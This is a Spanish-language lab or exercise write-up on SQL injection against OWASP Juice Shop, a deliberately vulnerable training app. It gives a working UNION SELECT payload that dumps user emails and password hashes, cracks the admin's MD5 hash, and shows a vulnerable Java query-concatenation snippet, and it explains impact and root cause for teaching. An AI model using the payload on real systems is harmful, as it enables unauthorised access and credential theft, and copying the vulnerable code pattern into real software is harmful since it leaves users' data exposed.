# SOLUCIÓN COMPLETA DEL EJERCICIO  

## ENDPOINT VULNERABLE

GET /rest/products/search?q=apple


El parámetro `q` es controlado por el usuario y se utiliza en una consulta SQL sin validación ni parametrización.

---

## CONFIRMACIÓN DE LA VULNERABILIDAD

### Prueba inicial

Modificar el parámetro `q` por:


### Resultado observado

- La aplicación devuelve un error SQL
- Mensaje tipo `SQLITE_ERROR`

### Conclusión

La aplicación concatena directamente la entrada del usuario dentro de una consulta SQL.

> La vulnerabilidad **queda confirmada**.

Esta prueba es suficiente para justificar la existencia del fallo, ya que demuestra ejecución no controlada de SQL.

---

## EXPLOTACIÓN CONTROLADA (SOLUCIÓN DEL EJERCICIO)

### Análisis previo necesario

- La consulta original devuelve **9 columnas**
- Existe una tabla llamada `Users`
- Campos de interés: `email`, `password`

Para que `UNION SELECT` funcione:
- El número de columnas debe coincidir
- Los tipos deben ser compatibles

---

### Payload funcional correcto

```java

apple'))+UNION+SELECT+1,2,3,4,email,password,7,8,9+FROM+Users--

```

---

### Resultado obtenido

En la respuesta JSON del endpoint:

- Correos electrónicos aparecen reflejados en campos de productos
- Contraseñas aparecen como hashes

Ejemplo real observado:

```java

| Campo JSON   | Valor obtenido                 |
|-------------|--------------------------------|
| deluxePrice | admin@juice-sh.op              |
| image       | 0192023a7bbd73250516f069df18b500 |

```

Esto confirma:
- Acceso no autorizado a la tabla `Users`
- Exposición de credenciales

---

## IMPACTO REAL DE LA VULNERABILIDAD

Esta Inyección SQL permite:

- Acceder a datos personales de usuarios
- Robar credenciales
- Comprometer cuentas administrativas
- Escalar privilegios
- Comprometer completamente la aplicación

Desde el punto de vista de negocio:

- Pérdida de confidencialidad
- Incumplimiento legal (RGPD)
- Riesgo reputacional
- Riesgo crítico de seguridad

### Nivel de riesgo

**ALTO / CRÍTICO**

No es un fallo teórico: es **explotable y demostrable**.

---

## DESCIFRADO DE CONTRASEÑAS (PARTE FINAL DEL EJERCICIO)

### Hash obtenido

```java
0192023a7bbd73250516f069df18b500
```

Características:
- Algoritmo: MD5
- Algoritmo obsoleto e inseguro

Resultado del cracking:

```java
admin123
```

Con estas credenciales se accede correctamente al panel de administrador.

---

## CAUSA RAÍZ DEL PROBLEMA

La Inyección SQL ocurre por:

- Concatenar directamente datos del usuario
- No usar consultas parametrizadas
- Falta de validación server-side
- Confianza en la entrada del cliente

Importante:
> SQL Injection **no es un problema del lenguaje SQL**,  
> es un problema de **mal diseño del código**.

---

## EJEMPLO DE CÓDIGO VULNERABLE

```java
String query = "SELECT * FROM Products WHERE q = '" + search + "'";
Statement stmt = conn.createStatement();
ResultSet rs = stmt.executeQuery(query);
